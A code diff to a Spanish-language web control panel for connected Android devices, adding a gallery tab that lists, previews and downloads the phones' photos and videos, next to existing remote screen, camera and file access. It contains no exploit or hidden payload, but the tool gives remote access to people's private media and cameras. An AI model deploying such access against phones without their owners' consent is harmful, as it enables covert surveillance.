@@ -76,10 +76,31 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
   <div class="sidebar">
     <div class="tab active" onclick="showTab('screen')">🖥️ Pantalla</div>
     <div class="tab" onclick="showTab('camera')">📷 Cámara</div>
+    <div class="tab" onclick="showTab('gallery')">🖼️ Galería</div>
     <div class="tab" onclick="showTab('files')">📁 Archivos</div>
     <div class="tab" onclick="showTab('info')">📱 Info</div>
   </div>
   <div class="content">
+    <!-- Galería MediaStore -->
+    <div class="panel" id="panelGallery">
+      <div class="ctrl">
+        <button class="btn active" id="gBtnImg" onclick="loadGallery('images',0)">🖼️ Fotos</button>
+        <button class="btn" id="gBtnVid" onclick="loadGallery('videos',0)">🎬 Vídeos</button>
+        <button class="btn" id="gBtnAll" onclick="loadGallery('all',0)">📂 Todo</button>
+        <span id="galleryInfo" style="font-size:11px;color:#8B949E;margin-left:auto"></span>
+      </div>
+      <div id="galleryGrid" style="flex:1;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;padding:10px">
+        <div style="grid-column:1/-1;display:flex;align-items:center;justify-content:center;height:200px;color:#8B949E;font-size:13px">
+          Pulsa Fotos o Vídeos para ver la galería
+        </div>
+      </div>
+      <div class="ctrl" id="galleryNav" style="display:none">
+        <button class="btn" id="gPrev" onclick="galleryPage(-1)">← Anterior</button>
+        <span id="gPageInfo" style="font-size:12px;color:#8B949E;padding:0 8px"></span>
+        <button class="btn" id="gNext" onclick="galleryPage(1)">Siguiente →</button>
+      </div>
+    </div>
+
     <!-- Pantalla -->
     <div class="panel active" id="panelScreen">
       <div class="stream" id="screenArea"><div class="nosig">🖥️<br>Selecciona dispositivo<br>y pulsa ▶ Iniciar</div></div>
@@ -160,9 +181,13 @@ function connect(){
       if(msg.type==='device_list')         msg.devices.forEach(id=>addDevice(id));
       if(msg.type==='device_connected')    addDevice(msg.deviceId);
       if(msg.type==='device_disconnected') setOffline(msg.deviceId);
-      if(msg.type==='files')  renderFiles(msg.data,msg.path);
+      if(msg.type==='gallery') renderGallery(msg.items, msg.thumbs, msg.offset||0);
+      if(msg.type==='files')  renderFiles(msg.data, msg.path, msg.thumbs||{});
       if(msg.type==='info')   renderInfo(msg.data);
-      if(msg.type==='thumb')  receiveThumb(msg.reqId,msg.data);
+      if(msg.type==='thumb'){
+        if(msg.reqId&&msg.reqId.startsWith('m_')) receiveGalleryThumb(msg.reqId,msg.data);
+        else receiveThumb(msg.reqId,msg.data);
+      }
       if(msg.type==='download_data') receiveDownload(msg);
       if(msg.type==='upload_ok')   showToast('✅ Subido: '+msg.path);
       if(msg.type==='upload_error') showToast('❌ Error: '+msg.error);
@@ -219,12 +244,16 @@ function listFiles(path){
   cmd('list_files',{path});
 }
 
-function renderFiles(files,path){
+function renderFiles(files,path,thumbs){
+  currentPath=path||currentPath;
+  document.getElementById('pathBar').textContent='📂 '+currentPath;
   const el=document.getElementById('fileList');
   if(!files||!files.length){
     el.innerHTML='<div class="empty"><span style="font-size:36px">📭</span>Carpeta vacía</div>';
     return;
   }
+  // Guardar miniaturas en caché
+  if(thumbs){Object.entries(thumbs).forEach(([p,b64])=>{thumbCache[hashPath(p)]=b64;});}
   if(viewMode==='grid') renderGrid(files,el);
   else renderList(files,el);
 }
@@ -263,8 +292,7 @@ function renderGrid(files,el){
   imgs.forEach((f,i)=>{
     const reqId=hashPath(f.path);
     if(!thumbCache[reqId]) setTimeout(()=>cmd('thumb',{path:f.path,reqId}), i*150);
-  });
-}
+  });}
 
 function renderList(files,el){
   el.className='files';
@@ -378,12 +406,13 @@ function renderDevBar(){
 }
 
 function showTab(name){
-  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','files','info'][i]===name));
+  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','gallery','files','info'][i]===name));
   document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
   document.getElementById('panel'+name[0].toUpperCase()+name.slice(1))?.classList.add('active');
   stopAllStreams();
-  if(name==='info')cmd('info');
-  if(name==='files')listFiles(currentPath||'/sdcard');
+  if(name==='info')    cmd('info');
+  if(name==='files')   listFiles(currentPath||'/sdcard');
+  if(name==='gallery') loadGallery(galleryType, 0);
 }
 function setRS(on){const e=document.getElementById('relayStatus');e.textContent=on?'● Conectado':'● Desconectado';e.className='rs '+(on?'on':'off');}
 function icon(n){if(/\.(mp4|mov|avi|mkv)$/i.test(n))return'🎬';if(/\.(mp3|aac|wav)$/i.test(n))return'🎵';if(/\.pdf$/i.test(n))return'📄';if(/\.apk$/i.test(n))return'📦';if(/\.zip|\.rar$/i.test(n))return'🗜️';return'📄';}
@@ -396,6 +425,83 @@ function showToast(msg){
   if(!t){t=document.createElement('div');t.id='toast';t.style.cssText='position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:10px 18px;border-radius:10px;font-size:13px;z-index:9999;transition:opacity .3s';document.body.appendChild(t);}
   t.textContent=msg;t.style.opacity='1';
   clearTimeout(t._t);t._t=setTimeout(()=>{t.style.opacity='0';},3000);
+}
+
+// ── Galería ────────────────────────────────────────────────────────────────
+let galleryType='images', galleryOffset=0;
+const GALLERY_LIMIT=30;
+
+function loadGallery(type, offset){
+  galleryType=type; galleryOffset=offset;
+  ['gBtnImg','gBtnVid','gBtnAll'].forEach(id=>document.getElementById(id)?.classList.remove('active'));
+  const map={images:'gBtnImg',videos:'gBtnVid',all:'gBtnAll'};
+  document.getElementById(map[type])?.classList.add('active');
+  document.getElementById('galleryGrid').innerHTML=
+    '<div style="grid-column:1/-1;display:flex;align-items:center;justify-content:center;height:200px;color:#8B949E">⏳ Cargando galería...</div>';
+  cmd('gallery',{media_type:type, offset, limit:GALLERY_LIMIT});
+}
+
+function galleryPage(dir){
+  loadGallery(galleryType, Math.max(0, galleryOffset + dir*GALLERY_LIMIT));
+}
+
+function renderGallery(items, thumbs, offset){
+  const grid=document.getElementById('galleryGrid');
+  if(!items||!items.length){
+    grid.innerHTML='<div style="grid-column:1/-1;text-align:center;color:#8B949E;padding:40px">Sin elementos</div>';
+    return;
+  }
+  // Guardar miniaturas en caché
+  if(thumbs) Object.entries(thumbs).forEach(([id,b64])=>{ thumbCache['m_'+id]=b64; });
+
+  grid.innerHTML=items.map(f=>{
+    const tid='m_'+f.media_id;
+    const src=thumbCache[tid]?`data:image/jpeg;base64,${thumbCache[tid]}`:'';
+    const isVid=f.is_video;
+    return `<div style="position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#1E1B2E;aspect-ratio:1"
+                 onclick="downloadMedia(${f.media_id},'${esc2(f.name)}')">
+      <img id="gth_${f.media_id}" src="${src}" style="width:100%;height:100%;object-fit:cover;display:${src?'block':'none'}"
+           onerror="this.style.display='none'">
+      ${!src?`<div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:32px">${isVid?'🎬':'🖼️'}</div>`:''}
+      ${isVid?'<div style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,.6);color:#fff;font-size:9px;padding:2px 5px;border-radius:4px">▶ VID</div>':''}
+      <div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,.7);padding:4px 6px;font-size:9px;color:#fff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
+        ${esc2(f.name)}
+      </div>
+    </div>`;
+  }).join('');
+
+  // Pedir miniaturas faltantes
+  items.forEach(f=>{
+    const tid='m_'+f.media_id;
+    if(!thumbCache[tid]){
+      const el=document.getElementById('gth_'+f.media_id);
+      setTimeout(()=>{
+        cmd('gallery_thumb',{media_id:f.media_id, reqId:tid});
+      }, 100);
+    }
+  });
+
+  // Actualizar navegación
+  const nav=document.getElementById('galleryNav');
+  nav.style.display='flex';
+  document.getElementById('gPageInfo').textContent=`${offset+1}–${offset+items.length}`;
+  document.getElementById('gPrev').disabled=offset===0;
+  document.getElementById('galleryInfo').textContent=`${items.length} elementos`;
+}
+
+// Recibir miniatura de galería
+function receiveGalleryThumb(reqId, b64){
+  thumbCache[reqId]=b64;
+  const mediaId=reqId.replace('m_','');
+  const el=document.getElementById('gth_'+mediaId);
+  if(el){el.src='data:image/jpeg;base64,'+b64;el.style.display='block';}
+}
+
+function downloadMedia(mediaId, filename){
+  showToast('⏳ Descargando '+filename+'...');
+  const reqId='dl_'+Date.now();
+  dlCallbacks[reqId]={filename};
+  cmd('gallery_download',{media_id:mediaId, filename, reqId});
 }
 
 connect();
